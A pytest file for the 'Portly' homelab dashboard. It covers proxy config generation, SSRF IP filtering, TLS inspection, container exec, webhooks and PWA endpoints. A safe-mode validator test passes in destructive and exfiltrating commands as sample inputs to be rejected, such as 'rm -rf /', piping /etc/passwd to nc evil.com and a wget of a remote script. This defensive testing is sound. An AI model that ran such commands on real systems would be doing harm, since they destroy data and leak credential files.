"""Tests for advanced features: Proxy generator, Favicon fetcher & SSRF protection,
TLS inspector, In-Browser Terminal execution, Compose inspector, Webhooks & PWA endpoints.
"""

import json
from unittest.mock import MagicMock, patch
import pytest
from starlette.testclient import TestClient

from portly.backend import app as app_module
from portly.backend.proxy_gen import (
    generate_all_proxy_configs,
    generate_caddy_config,
    generate_nginx_config,
    generate_traefik_labels,
    generate_traefik_yaml_config,
    sanitize_domain,
    sanitize_router_name,
)
from portly.backend.favicon import (
    detect_image_type,
    get_fallback_svg,
    is_safe_target_ip,
    resolve_and_check_host,
)
from portly.backend.tls_inspector import inspect_tls_certificate
from portly.backend.actions.docker_actions import (
    FORBIDDEN_OPERATORS,
    SAFE_COMMAND_BINARIES,
    _validate_safe_command,
    exec_in_container,
    get_container_compose_config,
)
from portly.backend.notifications import (
    format_webhook_payload,
    send_webhook_sync,
)
from portly.backend.store import Store


# ==========================================
# 1. Reverse Proxy Generator Tests
# ==========================================
def test_proxy_generator_caddy():
    cfg = generate_all_proxy_configs("Gitea Server", 3000, "0.0.0.0", "git.myhomelab.net")
    snippet = cfg["configs"]["caddy"]
    assert "git.myhomelab.net {" in snippet
    assert "reverse_proxy 127.0.0.1:3000" in snippet

    # Default domain fallback
    default_cfg = generate_all_proxy_configs("Gitea Server", 3000, "127.0.0.1", None)
    assert "gitea-server.local {" in default_cfg["configs"]["caddy"]


def test_proxy_generator_nginx():
    cfg = generate_all_proxy_configs("Jellyfin", 8096, "192.168.1.10", "jellyfin.local")
    snippet = cfg["configs"]["nginx"]
    assert "server_name jellyfin.local;" in snippet
    assert "proxy_pass http://192.168.1.10:8096;" in snippet
    assert "Upgrade $http_upgrade;" in snippet


def test_proxy_generator_traefik():
    cfg = generate_all_proxy_configs("Grafana", 3000, "127.0.0.1", "grafana.local")
    yaml_snip = cfg["configs"]["traefik_yaml"]
    assert "grafana-router:" in yaml_snip
    assert "Host(`grafana.local`)" in yaml_snip
    assert "url: \"http://127.0.0.1:3000\"" in yaml_snip

    labels = cfg["configs"]["traefik_labels"]
    assert "traefik.enable=true" in labels
    assert "traefik.http.routers.grafana.rule=Host(`grafana.local`)" in labels


# ==========================================
# 2. Favicon Fetcher & SSRF Safeguards Tests
# ==========================================
def test_ssrf_ip_filtering():
    # Safe homelab and loopback IPs
    assert is_safe_target_ip("127.0.0.1") is True
    assert is_safe_target_ip("192.168.1.50") is True
    assert is_safe_target_ip("10.0.0.1") is True
    assert is_safe_target_ip("172.16.0.5") is True

    # Cloud metadata endpoints must be blocked
    assert is_safe_target_ip("169.254.169.254") is False
    assert is_safe_target_ip("169.254.1.1") is False

    # Multicast & broadcast / reserved
    assert is_safe_target_ip("224.0.0.1") is False
    assert is_safe_target_ip("240.0.0.1") is False
    assert is_safe_target_ip("0.0.0.0") is False

    # Non-routable / Invalid
    assert is_safe_target_ip("invalid-ip") is False


def test_image_mime_detection():
    # PNG signature: \x89PNG
    assert detect_image_type(b"\x89PNG\r\n\x1a\n...") == "image/png"
    # JPEG signature: \xff\xd8\xff
    assert detect_image_type(b"\xff\xd8\xff\xe0...") == "image/jpeg"
    # GIF signature: GIF89a
    assert detect_image_type(b"GIF89a...") == "image/gif"
    # ICO signature: \x00\x00\x01\x00
    assert detect_image_type(b"\x00\x00\x01\x00...") == "image/x-icon"
    # SVG signature
    assert detect_image_type(b"<svg xmlns=\"http://www.w3.org/2000/svg\">") == "image/svg+xml"
    assert detect_image_type(b"unknown bytes") is None


def test_fallback_svg_generation():
    svg_bytes, mime = get_fallback_svg("Portly Dashboard")
    assert mime == "image/svg+xml"
    svg_str = svg_bytes.decode("utf-8")
    assert svg_str.startswith("<svg")
    assert "</svg>" in svg_str
    assert "P" in svg_str  # Initial letter of Portly


# ==========================================
# 3. SSL / TLS Certificate Inspector Tests
# ==========================================
def test_tls_inspector_unreachable():
    # Unreachable port returns error payload cleanly without throwing
    res = inspect_tls_certificate("127.0.0.1", 59999, timeout=0.5)
    assert res["is_tls"] is False
    assert res["error"] is not None


@patch("ssl.get_server_certificate")
@patch("ssl._ssl._test_decode_cert")
def test_tls_inspector_success(mock_decode, mock_get_cert):
    mock_get_cert.return_value = "-----BEGIN CERTIFICATE-----\nMIIB..."
    mock_decode.return_value = {
        "subject": ((("commonName", "homelab.local"),),),
        "issuer": ((("organizationName", "Let's Encrypt"),),),
        "notBefore": "Nov 14 00:00:00 2026 GMT",
        "notAfter": "Feb 14 00:00:00 2027 GMT",
        "subjectAltName": (("DNS", "homelab.local"), ("DNS", "*.homelab.local")),
    }

    res = inspect_tls_certificate("127.0.0.1", 443)
    assert res["is_tls"] is True
    assert res["subject"] == "homelab.local"
    assert res["issuer"] == "Let's Encrypt"
    assert any("homelab.local" in s for s in res["san"])
    assert res["days_remaining"] is not None


# ==========================================
# 4. In-Browser Terminal & Compose Actions Tests
# ==========================================
def test_safe_mode_exec_whitelisting():
    # Command injection / operator chaining attempts must be blocked in Safe Mode
    with pytest.raises(PermissionError) as exc_op1:
        _validate_safe_command("ps aux && rm -rf /")
    assert "operator" in str(exc_op1.value)

    with pytest.raises(PermissionError) as exc_op2:
        _validate_safe_command("cat /etc/passwd | nc evil.com 1337")
    assert "operator" in str(exc_op2.value)

    # Non-whitelisted command in Safe Mode
    with pytest.raises(PermissionError) as exc_bin:
        _validate_safe_command("wget http://malicious.site/script.sh")
    assert "safe inspection whitelist" in str(exc_bin.value)

    # Whitelisted command without operators passes
    _validate_safe_command("ps aux")
    _validate_safe_command("df -h")
    _validate_safe_command("whoami")

    # Command launchers and arbitrary file readers must be rejected in Safe Mode
    with pytest.raises(PermissionError):
        _validate_safe_command("env")
    with pytest.raises(PermissionError):
        _validate_safe_command("cat /etc/shadow")


@patch("portly.backend.actions.docker_actions.get_docker_client")
def test_exec_in_container_success(mock_get_client):
    mock_client = MagicMock()
    mock_container = MagicMock()
    mock_container.exec_run.return_value = MagicMock(exit_code=0, output=b"USER PID %CPU %MEM COMMAND\nroot 1 0.0 0.1 node app.js")
    mock_client.containers.get.return_value = mock_container
    mock_get_client.return_value = mock_client

    res = exec_in_container("my-node-container", "ps aux")
    assert res["exit_code"] == 0
    assert "node app.js" in res["output"]


@patch("portly.backend.actions.docker_actions.get_docker_client")
def test_get_container_compose_config(mock_get_client):
    mock_client = MagicMock()
    mock_container = MagicMock()
    mock_container.name = "postgres_db"
    mock_container.attrs = {
        "Config": {
            "Labels": {
                "com.docker.compose.project": "homelab_stack",
                "com.docker.compose.service": "postgres",
                "com.docker.compose.project.working_dir": "/opt/homelab",
                "com.docker.compose.project.config_files": "/opt/homelab/docker-compose.yml",
            }
        }
    }
    mock_client.containers.get.return_value = mock_container
    mock_get_client.return_value = mock_client

    info = get_container_compose_config("postgres_db")
    assert info["has_compose"] is True
    assert info["project"] == "homelab_stack"
    assert info["service"] == "postgres"
    assert info["config_file"].replace("\\", "/").endswith("/opt/homelab/docker-compose.yml")


# ==========================================
# 5. Webhook Notifications Formatting Tests
# ==========================================
def test_webhook_payload_formatters():
    # Discord format
    _, discord_body = format_webhook_payload("discord", "port_opened", "New port 8080 opened by nginx")
    discord_data = json.loads(discord_body.decode("utf-8"))
    assert "embeds" in discord_data
    assert "Portly" in discord_data["embeds"][0]["title"]

    # Slack format
    _, slack_body = format_webhook_payload("slack", "port_opened", "New port 8080 opened by nginx")
    slack_data = json.loads(slack_body.decode("utf-8"))
    assert "text" in slack_data
    assert "Portly" in slack_data["text"]

    # Generic format
    headers, generic_body = format_webhook_payload("generic", "port_opened", "New port 8080 opened by nginx")
    generic_data = json.loads(generic_body.decode("utf-8"))
    assert generic_data["event"] == "port_opened"
    assert headers["Content-Type"] == "application/json"


# ==========================================
# 6. Full API Endpoints Integration Tests
# ==========================================
@pytest.fixture
def test_app_client(tmp_path):
    # Set up isolated store
    db_path = str(tmp_path / "test_api_new.db")
    test_store = Store(db_path)

    test_app = {
        "id": "test_app_1",
        "name": "Nginx Web",
        "port": 80,
        "protocol": "tcp",
        "bind": "0.0.0.0",
        "source": "docker",
        "container_id": "c_nginx_123",
        "container_name": "nginx_web",
        "status": "up",
        "open_url": "http://127.0.0.1:80",
    }
    test_store.upsert_custom_app("test_app_1", "Nginx Web", "127.0.0.1", 80)

    orig_store = app_module.store
    orig_cached = list(app_module._cached_apps)
    app_module.store = test_store
    app_module._cached_apps = [test_app]
    client = TestClient(app_module.app)
    yield client
    app_module.store = orig_store
    app_module._cached_apps = orig_cached


def test_endpoint_proxy_config(test_app_client):
    res = test_app_client.get("/api/apps/test_app_1/proxy-config?domain=web.home.arpa")
    assert res.status_code == 200
    data = res.json()
    configs = data["configs"]
    assert "caddy" in configs
    assert "nginx" in configs
    assert "traefik_yaml" in configs
    assert "traefik_labels" in configs
    assert "web.home.arpa" in configs["caddy"]


def test_endpoint_favicon(test_app_client):
    res = test_app_client.get("/api/apps/test_app_1/favicon")
    assert res.status_code == 200
    assert "image/" in res.headers["content-type"]
    assert len(res.content) > 0


def test_endpoint_tls(test_app_client):
    res = test_app_client.get("/api/apps/test_app_1/tls")
    assert res.status_code == 200
    data = res.json()
    assert "is_tls" in data


def test_endpoint_pwa_manifest_and_sw(test_app_client):
    # Manifest
    manifest_res = test_app_client.get("/manifest.webmanifest")
    assert manifest_res.status_code == 200
    mdata = manifest_res.json()
    assert "Portly" in mdata["name"]
    assert mdata["short_name"] == "Portly"
    assert mdata["display"] == "standalone"

    # Service Worker
    sw_res = test_app_client.get("/sw.js")
    assert sw_res.status_code == 200
    assert "javascript" in sw_res.headers["content-type"]
    assert "portly-v" in sw_res.text


def test_endpoint_test_webhook(test_app_client):
    with patch("urllib.request.urlopen") as mock_urlopen:
        mock_resp = MagicMock()
        mock_resp.status = 200
        mock_resp.getcode.return_value = 200
        mock_urlopen.return_value.__enter__.return_value = mock_resp

        res = test_app_client.post("/api/settings/test-webhook", json={
            "url": "https://discord.com/api/webhooks/mock/123",
            "type": "discord",
        })
        assert res.status_code == 200
        assert res.json()["status"] == "ok"
